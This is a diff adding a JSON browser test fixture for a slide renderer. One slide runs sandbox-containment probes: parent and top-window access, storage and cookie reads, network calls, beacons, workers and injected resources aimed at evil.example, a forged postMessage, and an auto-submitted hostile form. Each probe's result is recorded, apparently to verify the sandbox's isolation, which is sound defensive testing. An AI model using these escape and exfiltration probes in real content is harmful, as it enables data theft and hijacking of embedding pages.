@@ -1,0 +1,57 @@
+{
+  "schemaVersion": 1,
+  "webinar": {
+    "id": 81,
+    "slug": "first-home-without-mystery",
+    "title": "Studio renderer browser fixture",
+    "liveVersion": 8
+  },
+  "master": {
+    "html": "<main class=\"fixture-slide\">{{SLIDE_CONTENT}}</main>",
+    "css": "*{box-sizing:border-box}html,body{width:100%;height:100%;margin:0;overflow:hidden}body{background:#0b3d3b;color:#fff;font:32px/1.3 system-ui,sans-serif}.fixture-slide{width:1920px;height:1080px;overflow:hidden;display:grid;place-content:center;padding:96px}.fixture-card{min-width:900px;padding:64px;border-top:16px solid #8cc63e;background:#123f3d}button{font:inherit}.fixture-probe{font-size:20px}"
+  },
+  "slides": [
+    {
+      "id": "11111111-1111-4111-8111-111111111111",
+      "position": 0,
+      "anchor": "normal",
+      "title": "Normal animation",
+      "html": "<section class=\"fixture-card\"><h1>Normal animation</h1><p data-animation-output>0 / 3</p></section>",
+      "css": "h1{margin:0 0 24px;color:#8cc63e}",
+      "javascript": "(()=>{let current=0;let playing=false;const total=3;const output=document.querySelector('[data-animation-output]');const emit=()=>{output.textContent=current+' / '+total;window.msfgRuntime.emit('animation-state',{current,total,playing});};addEventListener('msfg:slide-enter',emit);addEventListener('msfg:animation-forward',()=>{current=Math.min(total,current+1);emit();});addEventListener('msfg:animation-back',()=>{current=Math.max(0,current-1);emit();});addEventListener('msfg:animation-play',()=>{playing=true;emit();});addEventListener('msfg:animation-pause',()=>{playing=false;emit();});})();"
+    },
+    {
+      "id": "22222222-2222-4222-8222-222222222222",
+      "position": 1,
+      "anchor": "containment",
+      "title": "Containment attempts",
+      "html": "<section class=\"fixture-card\"><h1>Containment attempts</h1><p class=\"fixture-probe\" data-containment-output>Running probes</p><form action=\"https://evil.example/form\" method=\"post\" data-hostile-form><button type=\"submit\">Submit hostile form</button></form></section>",
+      "css": "h1{margin:0 0 24px;color:#8cc63e}@font-face{font-family:Hostile;src:url('https://evil.example/font.woff2')}[data-containment-output]{font-family:Hostile,system-ui}",
+      "javascript": "(async()=>{const results={};const delay=()=>new Promise((_,reject)=>setTimeout(()=>reject(new DOMException('Timed out','TimeoutError')),150));const probe=async(name,fn)=>{try{const value=await Promise.race([Promise.resolve().then(fn),delay()]);results[name]={blocked:false,value:String(value)};}catch(error){results[name]={blocked:true,error:String(error&&error.name||'Error')};}};await probe('parentDocument',()=>{parent.document.documentElement.dataset.trustedGuard='pwned';return parent.document.title;});await probe('topRead',()=>top.location.href);await probe('topNavigate',()=>{top.location.href='https://evil.example/top';return top.location.href;});await probe('popup',()=>{const value=open('https://evil.example/popup');if(value===null)throw new DOMException('Blocked','SecurityError');return value;});await probe('localStorage',()=>localStorage.length);await probe('sessionStorage',()=>sessionStorage.length);await probe('cookie',()=>{document.cookie='fixture=escape';return document.cookie;});await probe('indexedDB',()=>new Promise((resolve,reject)=>{const request=indexedDB.open('escape');request.onsuccess=()=>resolve('opened');request.onerror=()=>reject(request.error||new Error('blocked'));}));await probe('fetch',()=>fetch('https://evil.example/fetch'));await probe('xhr',()=>new Promise((resolve,reject)=>{const xhr=new XMLHttpRequest();xhr.onload=()=>resolve(xhr.status);xhr.onerror=()=>reject(new Error('blocked'));xhr.open('GET','https://evil.example/xhr');xhr.send();}));await probe('websocket',()=>new Promise((resolve,reject)=>{const socket=new WebSocket('wss://evil.example/socket');socket.onopen=()=>resolve('opened');socket.onerror=()=>reject(new Error('blocked'));}));await probe('eventSource',()=>new Promise((resolve,reject)=>{const stream=new EventSource('https://evil.example/events');stream.onopen=()=>resolve('opened');stream.onerror=()=>{stream.close();reject(new Error('blocked'));};}));await probe('beacon',()=>{if(navigator.sendBeacon('https://evil.example/beacon','escape'))return 'sent';throw new Error('blocked');});await probe('worker',()=>{const worker=new Worker('https://evil.example/worker.js');worker.terminate();return 'created';});await probe('serviceWorker',()=>navigator.serviceWorker?navigator.serviceWorker.register('https://evil.example/sw.js'):Promise.reject(new Error('unavailable')));for(const [tag,attribute,url] of [['script','src','https://evil.example/external.js'],['link','href','https://evil.example/external.css'],['img','src','https://evil.example/image.png'],['audio','src','https://evil.example/audio.mp3'],['video','src','https://evil.example/video.mp4'],['iframe','src','https://evil.example/frame']]){const node=document.createElement(tag);if(tag==='link')node.rel='stylesheet';node[attribute]=url;document.body.append(node);}const download=document.createElement('a');download.href='https://evil.example/download';download.download='escape.txt';download.click();document.querySelector('[data-hostile-form]').requestSubmit();parent.postMessage({v:1,nonce:'attacker-cannot-know',type:'animation-state',payload:{current:999,total:999,playing:true},privateSource:'escape'},'*');document.documentElement.dataset.containment=JSON.stringify(results);document.querySelector('[data-containment-output]').textContent='Probes complete';})();"
+    },
+    {
+      "id": "33333333-3333-4333-8333-333333333333",
+      "position": 2,
+      "anchor": "sync-error",
+      "title": "Synchronous runtime failure",
+      "html": "<section class=\"fixture-card\"><h1>Synchronous runtime failure</h1></section>",
+      "css": "h1{color:#8cc63e}",
+      "javascript": "throw new Error('fixture-sync-private-source');"
+    },
+    {
+      "id": "44444444-4444-4444-8444-444444444444",
+      "position": 3,
+      "anchor": "async-error",
+      "title": "Asynchronous runtime failure",
+      "html": "<section class=\"fixture-card\"><h1>Asynchronous runtime failure</h1></section>",
+      "css": "h1{color:#8cc63e}",
+      "javascript": "Promise.resolve().then(()=>{throw new Error('fixture-async-private-source');});"
+    }
+  ],
+  "assets": {},
+  "resourcePolicy": {
+    "assetOrigin": "https://assets.example",
+    "stylesheetOrigins": [],
+    "fontOrigins": []
+  }
+}
